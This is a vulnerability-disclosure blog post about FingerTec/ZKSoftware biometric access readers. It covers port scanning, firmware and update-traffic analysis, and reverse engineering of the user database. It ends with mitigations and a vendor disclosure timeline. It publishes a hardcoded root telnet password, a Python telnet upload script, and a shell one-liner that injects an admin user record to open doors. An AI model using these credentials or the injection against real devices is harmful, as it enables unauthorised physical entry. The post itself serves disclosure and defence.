---
layout: post
title:  "FingerTec Biometric Access Control Devices - Remote Code Exec and Remote Enrollment"
date:   2016-01-01 12:00:00 -0500
categories: fingertec access control rce
description: Exploiting poor design to open your office's front door
comments: true
image: /images/fingertec-post.jpg
tags:
  - fingertec
  - rce
  - telnet
  - wireshark

---

## Overview

In a company I worked for years ago, we moved from card swipe to biometric readers for access control.  It was more convenient for the office staff, and people didn't lose their fingers nearly as often as cards.  The first ones we got were BioScrypt V-Flex readers, by KanTech.  They were expensive, wired into this serial port muxing mess, and shorted out if you had any static on you.

![BioScrypt Readers](/images/Bioscrypt_V-flex.jpg)

A few years ago we found FingerTec devices.  They had much better fingerprint detection, were static proof, and most importantly, used TCP/IP.  This meant that we could easily manage dozens of devices over several offices geographically.  They also accept RFID and/or pin codes, and any combination thereof.  We started off with the AC900s and moved up to the R2s.

![FingerTec R2](/images/fingertec.jpg)

I've been wanting to play with these in a bit more detail, and a couple of months ago I got some free time to work on it.

## Initial analysis

First thing I did was run a port scan on the device.  I'm doing this on a spare AC900 that we have.

    $ nmap 10.117.43.12 -A -p0-65535

    Starting Nmap 7.00 ( https://nmap.org ) at 2015-12-16 15:54 EST
    Nmap scan report for 10.117.43.12
    Host is up (0.057s latency).
    Not shown: 65533 closed ports
    PORT     STATE    SERVICE VERSION
    0/tcp    filtered unknown
    23/tcp   open     telnet  ZKSoftware ZEM500 fingerprint reader telnetd (Linux 2.4.20; MIPS)
    4368/tcp open     unknown
    Service Info: OS: Linux; Device: security-misc; CPE: cpe:/o:linux:linux_kernel:2.4.20

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 163.61 seconds

Ok, so it is running telnet.

    $ telnet 10.117.43.12
    Trying 10.117.43.12...
    Connected to 10.117.43.12.
    Escape character is '^]'.

    Welcome to Linux (ZEM500) for MIPS
    Kernel 2.4.20 Treckle on an MIPS
    ZEM500 login: 

## Attack

A quick google search turns up some interesting information from other people:

[kishfellow.blogspot.com](http://kishfellow.blogspot.com/2013/11/website-www.html)

and

[blog.infobytesec.com](http://blog.infobytesec.com/2014/07/perverting-embedded-devices-zksoftware_2920.html)

It seems the base device is made by ZKSoftware, and FingerTec resells/customizes it.  There is no web server running, so I can't try out any of those vulnerabilities.  All I have is telnet, and the software's own protocol.

My goal: Get the root password.  I'd be willing to bet money at this point it is a hard coded password.

I also happen to have a firmware update.  Maybe I'd get lucky and the firmware is just an ext3 image.

    $ unzip ~/Downloads/AC900_565.zip 
    Archive:  /home/danny/Downloads/AC900_565.zip
      inflating: FTUpdate.exe            
      inflating: main.tgz                
      inflating: Readme.txt  

Ok, so it uses a windows application to do the updating.  Contents of Readme.txt:

    Please follow below steps to update:

    1. Enter your reader IP and connect
    2. Check the manu date (manufacturer date) display in the list after connect
    3. If you reader manu date if before July 2008, please select "Customize Options", else just select "Default Options"
    4. Click Udpdate and wait until 5 steps completed. 
    5. Reader will restart after successful.



    ps: 
    1. If you selected "Default Options" and the update program stuck after "Connected", please select "Customize Options" and reupdate. 

    2. If it's still stuck, please go to reader MENU -> Options -> Comm Opt -> COMM Key, change to "1", restart reader and change it back to "0" and restart it again. After restart please select "Customize Options" and update again.

    3. If you selected "Customize Options" and the update program stuck after "Connected", please select "Default Options" and reupdate.

Well, seems simple enough.  Time to extract main.tgz, which probably contains a disk image.

    $ tar zxfv main.tgz
    auto.sh
    LANGUAGE.E
    libdlcl.so
    main

Wait.. what the..

    $ file main
    main: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld.so.1, for GNU/Linux 2.6.0, stripped

Ok, this appears to be just files, that are updated.  This obviously seems ripe for embedding malware and just uploading that as a firmware update can probably get me in.  How about that auto.sh

    #!/bin/sh
    SRC=$USERDATAPATH
    DEST=/mnt/mtdblock
    DEST2=/mnt/mtdblock/drivers
    DEST3=/mnt/mtdblock/data

    ifconfig eth0 192.168.1.201 up

    ALGOLIB=/mnt/mtdblock/lib/libzkfp.so.3.5.1
    ALGOLIB=/mnt/mtdblock/lib/libzkfp.so.3.5.1
    export FPSENSORLIB_PATH=/mnt/mtdblock/lib/fpsensor_lib
    if [ -f  /mnt/mtdblock/lib/libfpsensor.so ]; then
    ln -s /mnt/mtdblock/lib/libfpsensor.so /lib/libfpsensor.so -f
    fi

    ln -s $DEST/lib/libzkfp.so.3.5.1 /lib/libzkfp.so.3 -f
    ln -s $DEST/lib/libzkfp.so.3.5.1 /lib/libzkfp.so -f
    ln -s $DEST/lib/libzkfp.so.4.0.0 /lib/libzkfp.so.10 -f
    ln -s $DEST/lib/libpthread.so /lib/libpthread.so.0 -f
    ln -s $DEST/lib/libfpsensor.so /lib/libfpsensor.so -f
    ln -s $DEST/lib/libdlcl.so.1 /lib/libdlcl.so -f
    ln -s $DEST/lib/libstdc++.so.6.0.8 /lib/libstdc++.so.6 -f
    ln -s $DEST/lib/libgcc_s.so.1 /lib/libgcc_s.so.1 -f
    ln -s $DEST/lib/libttf.so /lib/libttf.so -f
    ln -s $DEST/lib/libhttppush.so /lib/libhttppush.so -f
    ln -s /mnt/mtdblock/libdlcl.so /lib/libdlcl.so -f

    mknod /dev/video0 c 81 0
    mknod /dev/uba  b 180 0 
    mknod /dev/uba1 b 180 1
    mknod /dev/uba2 b 180 2
    mknod /dev/ubb  b 180 8
    mknod /dev/ubb1 b 180 9
    mknod /dev/ubb2 b 180 10
    mknod /dev/ubc  b 180 16
    mknod /dev/ubc1 b 180 17
    mknod /dev/ubc2 b 180 18
    mknod /dev/ubd  b 180 24
    mknod /dev/ubd1 b 180 25
    mknod /dev/ubd2 b 180 26
    mknod /dev/ube  b 180 32
    mknod /dev/ube1 b 180 33
    mknod /dev/ube2 b 180 34
    mknod /dev/ubf  b 180 40
    mknod /dev/ubf1 b 180 41
    mknod /dev/ubf2 b 180 42
    mknod /dev/ubg  b 180 48
    mknod /dev/ubg1 b 180 49
    mknod /dev/ubg2 b 180 50
    mount  -t usbfs none /proc/bus/usb

    if [ -f  /mnt/mtdblock/drivers/gspca.ko ]; then
            insmod /mnt/mtdblock/drivers/gspca.ko
    fi
    if [ -f  /mnt/mtdblock/lib/libfpsensor.so ]; then
    ln -s /mnt/mtdblock/lib/libfpsensor.so /lib/libfpsensor.so -f
    fi
    if [ -f  /mnt/mtdblock/lib/libjpeg.so ]; then
    ln -s /mnt/mtdblock/lib/libjpeg.so /lib/libjpeg.so.62 -f
    fi
    if [ -f $DEST/lib/libzkfp.so.4.0.0 ]; then
        cd $DEST/lib && gunzip libzkfp.so.4.0.0 -f  && sync
    fi

    if [ -f $DEST/libwebserver.tgz ]; then
      cd /lib && tar -zxvf $DEST/libwebserver.tgz
    fi

    if [ -f /mnt/mtdblock/libwebserver_a.so ]; then
            ln -s /mnt/mtdblock/libwebserver_a.so /lib/libweb.so -f
    fi

    if [ -d $DEST/data/ ]; then
        if [ -f $DEST3/extlog.dat ]; then
            echo "extlog in /mnt/mtdblock/data"
        else
            if [ -f $DEST/extlog.dat ]; then
                mv $DEST/extlog.dat $DEST/data/ && cd $DEST && rm $DEST/extlog.dat && sync
            fi
        fi
    fi

    if [ -d $DEST/data/ ]; then
        if [ -f $DEST3/transaction.dat ]; then
            echo "transaction in /mnt/mtdblock/data"
        else
            if [ -f $DEST/transaction.dat ]; then
                mv $DEST/transaction.dat $DEST/data/ && cd $DEST && rm $DEST/transaction.dat && sync
            fi
        fi
    fi
                                                    
    if [ -f $DEST/mainwav ]; then
            cd $DEST && chmod u+x $DEST/mainwav && $DEST/mainwav
    fi

    if [ -f $DEST/playwav ]; then
         cd $DEST && chmod u+x $DEST/playwav && $DEST/playwav E_0.wav;
    fi

    if [ -f $DEST/drivers/hv7131.ko ]; then
         insmod $DEST/drivers/hv7131.ko
    fi

    if [ -f $DEST2/cim.ko ]; then
            insmod $DEST2/cim.ko 
    fi

    if [ -f $DEST2/dummy.ko ]; then
            insmod $DEST2/dummy.ko 
    fi

    if [ ! -c /dev/ttygs ]; then
      mknod /dev/ttygs c 127 0
    fi

    if [ -f $DEST2/nand_drv.ko ]; then
            insmod $DEST2/nand_drv.ko 
    fi

    if [ -f $DEST2/jz4730_udc.ko ]; then
            insmod $DEST2/jz4730_udc.ko
    fi

    if [ -f $DEST2/g_serial.ko ]; then
            insmod $DEST2/g_serial.ko use_acm=1
    fi

    if [ -f /mnt/mtdblock/rt73.ko ]; then
            cd /mnt/mtdblock/drivers && rm jz4730_udc.ko g_serial.ko -f && sync
    fi

    if [ -f /mnt/mtdblock/rt73.ko ]; then
            insmod /mnt/mtdblock/rt73.ko
    fi

    rm -rf /etc/rt73sta.dat

    if [ -f $DEST/usbpower.zem500 ]; then
      chmod u+x $DEST/usbpower.zem500 && $DEST/usbpower.zem500
    fi

    if [ -f $DEST/main.gz ]; then
      cd $DEST && rm main -f && gunzip main.gz && sync
    fi

    if [ -f $DEST/main ]; then
       chmod u+x $DEST/main && cd $DEST && $DEST/main&
    fi

    if [ -f $DEST/inbiocomm ];then
      chmod u+x $DEST/inbiocomm && cd $DEST && $DEST/inbiocomm&
    fi
      
    if [ -f $DEST/data/wdt_new ]; then
      cd $DEST/data && chmod u+x $DEST/data/wdt_new && $DEST/data/wdt_new -p 5 -t 3600 -m "$DEST/main" -n "$DEST/inbiocomm"
    fi

Well, that looks like a startup script if I've ever seen one.  Now I'm going to try and run the firmware update cleanly, and just capture what happens.

![FingerTec Update success](/images/fingertec_update.png)

Well, it looks like the update went through fine.  Next I scrolled through the packet capture.  

![FingerTec Packet Capture 1](/images/fingertec_packet1.png)

It looks like it tries to connect via TCP a couple of times, fails, and then connects via UDP.  This is what gives the initial version and device info before you hit 'update'.  Scrolling it bit farther down you find...

![FingerTec Packet Capture 2](/images/fingertec_packet2.png)

*TELNET!?!?!*   Why would the update process be communicating over telnet?

![FingerTec Packet Capture 3](/images/fingertec_packet3.png)

Well, as we can see here, the update software starts a tftp server, telnets in as root, and tells the device to tftp the update from the fingerprint reader.  Then it extracts it over the flash storage.  It actually failed to get the file since the TFTP server doesn't seem to know anything about disabling firewalls.  

## Exploitation

Now that we have the root password, let's see what we can do on this device

    Welcome to Linux (ZEM500) for MIPS
    Kernel 2.4.20 Treckle on an MIPS
    ZEM500 login: root
    Password: 


    BusyBox v1.1.3 (2007.10.09-20:41+0000) Built-in shell (ash)
    Enter 'help' for a list of built-in commands.

    # busybox
    BusyBox v1.1.3 (2007.10.09-20:41+0000) multi-call binary

    Usage: busybox [function] [arguments]...
       or: [function] [arguments]...

            BusyBox is a multi-call binary that combines many common Unix
            utilities into a single executable.  Most people will create a
            link to busybox for each function they wish to use and BusyBox
            will act like whatever it was invoked as!

    Currently defined functions:
            [, [[, ash, bunzip2, busybox, bzcat, cat, chmod, cp, date, df,
            dmesg, du, echo, env, free, ftpget, ftpput, getty, gunzip, gzip,
            halt, hostname, ifconfig, inetd, init, insmod, kill, killall,
            ln, login, ls, lsmod, mkdir, mknod, mount, mv, passwd, ping, poweroff,
            ps, pwd, rdate, reboot, rm, rmdir, rmmod, route, sh, sync, tar,
            telnetd, test, tftp, traceroute, tty, umount, uptime, vi, wget,
            zcat

    # 

It seems we have a pretty limited busybox shell.  We do have ftpput and ftpget though, and we can use those to transfer files.  I didn't really feel like getting an FTP server set up for this though, so instead wrote a script to use echo to upload a more recent version of busybox.

{% highlight python %}
#!/usr/bin/env python
import socket
import telnetlib
import sys
import pdb
import base64


class RemoteServer:
    def __init__(self, server=None,port=23,username=b'root',password=None,color=False):
        if server:
            if type(server) is str:
                self.server = server.encode()
            self.server = server
        self.port = port
        if type(username) is str:
            self.username = username.encode()
        else:
            self.username = username

        if type(password) is str:
            self.password = password.encode()
        else:
            self.password = password

        if color:
            import colorama
            colorama.init()


    def connect(self):
        self.tn = telnetlib.Telnet(self.server)
        self.tn.read_until(b"login: ")
        self.tn.write(self.username + b'\n')
        self.tn.read_until(b"Password: ")
        self.tn.write(self.password + b'\n')
        self.tn.read_until(b"# ")

    def run_cmd(self, cmd, end=b"# "):
        if type(cmd) is str:
            cmd = cmd.encode()
        self.tn.write(cmd + b'\n')
        res = self.tn.read_until(b'# ')
        return res[len(cmd)+2:]

    def upload_file(self, filename):
        with open(filename, 'rb') as f:
            while True:
                data = f.read(512)
                if not data:
                    break
                line = b''.join([b'\\\\x' + hex(a)[2:].encode() for a in data])
                self.run_cmd(b'echo -n -e ' + line + b' >> ' + filename.encode())
        return True

    
if __name__ == '__main__':
    server='10.117.43.12'
    print("Connecting to %s" % server)
    t = RemoteServer(server=server, username='root', password='founder88')
    t.connect()
    print("Checking for busybox-mipsel binary")
    res = t.run_cmd('ls /root/busybox-mipsel')
    
    if b'No such file or directory' in res:
        print("Busybox binary not found.  Uploading new binary (This may take a little while, be patient)")
        t.upload_file('busybox-mipsel.gz')
        print("Upload complete - extracting")
        t.run_cmd('gunzip busybox-mipsel.gz')
        t.run_cmd('chmod +x busybox-mipsel')

{% endhighlight %}

After running it, busybox is copied over.

    # ./busybox-mipsel 
    BusyBox v1.16.1 (2010-03-29 11:52:23 CDT) multi-call binary.
    Copyright (C) 1998-2009 Erik Andersen, Rob Landley, Denys Vlasenko
    and others. Licensed under GPLv2.
    See source distribution for full notice.

    Usage: busybox [function] [arguments]...
       or: function [arguments]...

            BusyBox is a multi-call binary that combines many common Unix
            utilities into a single executable.  Most people will create a
            link to busybox for each function they wish to use and BusyBox
            will act like whatever it was invoked as.

    Currently defined functions:
            [, [[, acpid, addgroup, adduser, adjtimex, arp, arping, ash, awk,
            basename, bbconfig, beep, blkid, brctl, bunzip2, bzcat, bzip2, cal,
            cat, catv, chat, chattr, chgrp, chmod, chown, chpasswd, chpst, chroot,
            chrt, chvt, cksum, clear, cmp, comm, cp, cpio, crond, crontab, cryptpw,
            cttyhack, cut, date, dc, dd, deallocvt, delgroup, deluser, depmod,
            devmem, df, dhcprelay, diff, dirname, dmesg, dnsd, dnsdomainname,
            dos2unix, dpkg, dpkg-deb, du, dumpkmap, dumpleases, echo, ed, egrep,
            eject, env, envdir, envuidgid, ether-wake, expand, expr, fakeidentd,
            false, fbset, fbsplash, fdflush, fdformat, fdisk, fgrep, find, findfs,
            flashcp, fold, free, freeramdisk, fsck, fsck.minix, fsync, ftpd,
            ftpget, ftpput, fuser, getopt, getty, grep, gunzip, gzip, halt, hd,
            hdparm, head, hexdump, hostid, hostname, httpd, hush, hwclock, id,
            ifconfig, ifdown, ifenslave, ifplugd, ifup, inetd, init, insmod,
            install, ionice, ip, ipaddr, ipcalc, ipcrm, ipcs, iplink, iproute,
            iprule, iptunnel, kbd_mode, kill, killall, killall5, klogd, lash, last,
            length, less, linux32, linux64, linuxrc, ln, loadfont, loadkmap,
            logger, login, logname, logread, losetup, lpd, lpq, lpr, ls, lsattr,
            lsmod, lspci, lsusb, lzmacat, lzop, lzopcat, makedevs, makemime, man,
            md5sum, mdev, mesg, microcom, mkdir, mkdosfs, mkfifo, mkfs.minix,
            mkfs.reiser, mkfs.vfat, mknod, mkpasswd, mkswap, mktemp, modprobe,
            more, mount, mountpoint, msh, mt, mv, nameif, nc, netstat, nice,
            nmeter, nohup, nslookup, ntpd, od, openvt, passwd, pgrep, pidof, ping,
            ping6, pipe_progress, pivot_root, pkill, popmaildir, poweroff,
            printenv, printf, ps, pscan, pwd, raidautorun, rdate, rdev, readahead,
            readlink, readprofile, realpath, reboot, reformime, renice, reset,
            resize, rm, rmdir, rmmod, route, rpm, rpm2cpio, rtcwake, run-parts,
            runlevel, runsv, runsvdir, rx, script, scriptreplay, sed, sendmail,
            seq, setarch, setconsole, setfont, setkeycodes, setlogcons, setsid,
            setuidgid, sh, sha1sum, sha256sum, sha512sum, showkey, slattach, sleep,
            softlimit, sort, split, start-stop-daemon, stat, strings, stty, su,
            sulogin, sum, sv, svlogd, swapoff, swapon, switch_root, sync, sysctl,
            syslogd, tac, tail, tar, tcpsvd, tee, telnet, telnetd, test, tftp,
            tftpd, time, timeout, top, touch, tr, traceroute, traceroute6, true,
            tty, ttysize, tunctl, udhcpc, udhcpd, udpsvd, umount, uname,
            uncompress, unexpand, uniq, unix2dos, unlzma, unlzop, unzip, uptime,
            usleep, uudecode, uuencode, vconfig, vi, vlock, volname, wall, watch,
            watchdog, wc, wget, which, who, whoami, xargs, yes, zcat, zcip

    # 

That is much better!  Since this device can enroll RFID cards, pin codes, and fingerprints, let's see if we can find where they are stored.
We'll go right into /mnt/mtdblock, since that seems to be where the earlier firmware update wanted to extract to.

    # ls
    CmdScriptBW_2.sh    custvoice.dat       libfpsensor.so      sms.dat
    ErrorCardEvent.dat  data                libhttppush.so      template.dat
    LANGUAGE.E          dhcp.txt            libzkfp.so.3.5.1    udata.dat
    OfflineEvent.dat    dump.txt            main                udhcpc
    Script.sh           extuser.dat         mgetty              usbpower.zem500
    auto.sh             font                oplog.dat           user.dat
    beep.wav            htimezone.dat       options.cfg         wdt
    custattstate.dat    libdlcl.so.1        passwd              workcode.dat

It looks like the files that were supposed to be contained in that main.tgz would be extracted directly to here.  The user.dat catches my eye first.  I have 2 users enrolled on the reader right now (an admin, and a normal user).

    # /root/busybox-mipsel uuencode -m user.dat user
    begin-base64 777 user
    AQAGMTIzNAAAAAAAAAAAAAAAAAAAAQAAAQAAAAIAADY5NjkAAAAAAAAAAAAA
    AAAAAAEAANAHAAA=
    ====
    # 

Back on my local machine...

    echo 'AQAGMTIzNAAAAAAAAAAAAAAAAAAAAQAAAQAAAAIAADY5NjkAAAAAAAAAAAAAAAAAAAEAANAHAAA=' | base64 -d > user.dat

We can see here that the file is 56 bytes long:

    [danny@localhost code]$ ls -al user.dat
    -rw-r--r-- 1 danny users 56 Jan  6 17:09 user.dat

From this, we can assume that each record would be 28 bytes long.  Just to make things easier, we'll dump it to hex like so:

    [danny@localhost code]$ hexdump -e '28/1 "%02x " "\n"' user.dat
    01 00 06 31 32 33 34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 01 00 00 00
    02 00 00 36 39 36 39 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 d0 07 00 00

Looking at this, we can tell a few things right off the bat.  To make it easier, I've labeled the columns

     1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28
    -----------------------------------------------------------------------------------
    01 00 06 31 32 33 34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 01 00 00 00
    02 00 00 36 39 36 39 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 d0 07 00 00

Now, the admin was enrolled with id 1, and pin 1234.  The user was enrolled with id 2000, pin 6969.  Bytes 4-7 look to be ASCII, and actually correspond with the pin number.  Byte 1 seems to be an index number.  Byte 3 is most likely privilege level (6 for admin, 0 for user).  Bytes 25 looks to be the id for 1, and 0x07d0 is 2000, so the numbers are stored little endian.  Based off one of the production units, I was also able to see that 9-16 is an ascii Name, and 17-19 is the RFID card number (little endian).

## PoC

Ok, so now I know how the user database works.  How can I actually use this to get in a door?

    echo -n -e \\\\x39\\\\x5\\\\x6\\\\x31\\\\x32\\\\x33\\\\x34\\\\x35\\\\x48\\\\x61\\\\x78\\\\x78\\\\x30\\\\x72\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x1\\\\x0\\\\x0\\\\x39\\\\x5\\\\x0\\\\x0 >> user.dat

That simple one liner will append a record onto the user.dat file.  It will look like:

     1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28
    -----------------------------------------------------------------------------------
    39 05 06 31 32 33 34 35 48 61 78 78 30 72 00 00 00 00 00 00 00 01 00 00 39 05 00 00

This will create a user named Haxx0r, with id 1337, with a pin number of 12345.  Then you can just walk up to the door and let yourself in.

## Mitigation

Unfortunately, this isn't going to be patched anytime in the near future.  Obviously, the most effective mitigation is to take these devices completely off the network.  You then lose all of the advantages from having a centrally managed system, though.  In lieu of that, here is what you can do:

### Segregate the hell out of these things

Put them on their own vlan, with no access to the internet, and no access to/from any other vlans, with the exception of the management server.  There really is no good reason these things should be anywhere near the public internet (although a lot of them unfortunately are).

### Change the root telnet password

Luckily, it is pretty easy to change the root password.  You just set a new root password, then copy the passwd file (no shadow files here) over /mnt/mtdblock and /mnt/mtdblock/data

    # passwd
    Changing password for root
    Enter the new password (minimum of 5, maximum of 8 characters)
    Please use a combination of upper and lower case letters and numbers.
    Enter new password: 
    Re-enter new password: 
    Password changed.
    # cp /etc/passwd /mnt/mtdblock
    # cp /etc/passwd /mnt/mtdblock/data/

You will need to change the password back to founder88 in order to do any firmware updates.

## Disclosure Timeline

- 10/1/15 - Contacted FingerTec laying out issues and recommendations
- 10/1/15 - Received response (in 5 hours!) thanking me, and saying that they'd go over it with R&D
- 12/15/15 - Sent a follow up email, letting them know I'm looking at publishing the results on 1/1/2016
- 12/15/15 - Received response that due to complexity of firmwares, they won't be able to address the security concerns for awhile
- 1/7/16 - Disclosure

I mulled over quite a bit whether or not to drop the root password.  I decided to drop it because
A. Anyone with any level of skill could find it
B. There are at least 100 machines open on the internet vulnerable.  That doesn't include devices behind weak wifi, etc.
C. You need the root password in order to secure the device.

An access control system should never make it easier for a bad guy to get in.  I'm currently working on reversing the protocol that these readers natively speak, and will write up that whole process once I finish.





